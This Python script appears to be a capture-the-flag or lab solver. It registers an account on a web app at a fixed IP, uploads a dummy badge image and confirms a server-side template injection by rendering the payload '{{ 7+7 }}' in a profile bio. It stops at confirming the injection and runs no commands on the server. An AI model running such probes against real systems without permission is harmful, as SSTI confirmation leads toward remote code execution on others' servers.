#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re

BASE_URL = "http://94.237.56.175:48466"

session = requests.Session()

print("[*] Step-by-step manual testing...")

# Step 1: Sign up
print("\n[1] Signing up...")
signup_data = {'email': 'manual@test.com', 'username': 'manual', 'password': 'password123'}
r = session.post(f"{BASE_URL}/signup", data=signup_data)
print(f"    Status: {r.status_code}")
if "Account created" in r.text:
    print("    ✓ Account created")

# Step 2: Login
print("\n[2] Logging in...")
login_data = {'username': 'manual', 'password': 'password123'}
r = session.post(f"{BASE_URL}/login", data=login_data)
print(f"    Status: {r.status_code}")
if "Log in Successfull" in r.text or r.url.endswith('/verification'):
    print("    ✓ Logged in")

# Step 3: Upload verification document
print("\n[3] Uploading verification document...")
img = Image.new('RGB', (100, 100), color='red')
img_buffer = io.BytesIO()
img.save(img_buffer, format='JPEG')
img_buffer.seek(0)

files = {'file': ('badge.jpg', img_buffer, 'image/jpeg')}
r = session.post(f"{BASE_URL}/verification", files=files, allow_redirects=False)
print(f"    Status: {r.status_code}")
print(f"    Redirect: {r.headers.get('Location', 'None')}")

# Step 4: Try to access profile
print("\n[4] Accessing profile...")
r = session.get(f"{BASE_URL}/profile")
print(f"    Status: {r.status_code}")
if r.status_code == 200:
    if "Submit your Badge" in r.text:
        print("    ✗ Not verified yet")
    elif "bio" in r.text.lower():
        print("    ✓ Profile page accessible")

# Step 5: Try to update bio with simple text
print("\n[5] Updating bio with simple text...")
bio_data = {'bio': 'Hello World'}
r = session.post(f"{BASE_URL}/profile", data=bio_data)
print(f"    Status: {r.status_code}")
if "Bio updated" in r.text:
    print("    ✓ Bio updated with simple text")
elif "Bad Characters" in r.text:
    print("    ✗ Blocked by filter")
else:
    print(f"    Response snippet: {r.text[:500]}")

# Step 6: Create share link first!
print("\n[6] Creating share link...")
r = session.get(f"{BASE_URL}/getlink")
print(f"    Status: {r.status_code}")
if r.status_code == 200:
    print("    ✓ Share link created")

# Step 7: Access share link
print("\n[7] Accessing share link...")
r = session.get(f"{BASE_URL}/user/manual")
print(f"    Status: {r.status_code}")
if r.status_code == 200:
    match = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
    if match:
        content = match.group(1).strip()
        print(f"    Bio content: '{content}'")
elif r.status_code == 500:
    print("    ✗ 500 error - something wrong with template rendering")

# Step 8: Update bio with SSTI payload
print("\n[8] Updating bio with SSTI payload...")
bio_data = {'bio': '{{ 7+7 }}'}
r = session.post(f"{BASE_URL}/profile", data=bio_data)
print(f"    Status: {r.status_code}")
if "Bio updated" in r.text:
    print("    ✓ Bio updated with SSTI payload")
    
    # Access share link again
    r = session.get(f"{BASE_URL}/user/manual")
    print(f"    Share link status: {r.status_code}")
    if r.status_code == 200:
        match = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
        if match:
            content = match.group(1).strip()
            print(f"    SSTI result: '{content}'")
            if content == '14':
                print("    ✓✓✓ SSTI WORKS!")
    else:
        print(f"    Error accessing share link: {r.status_code}")
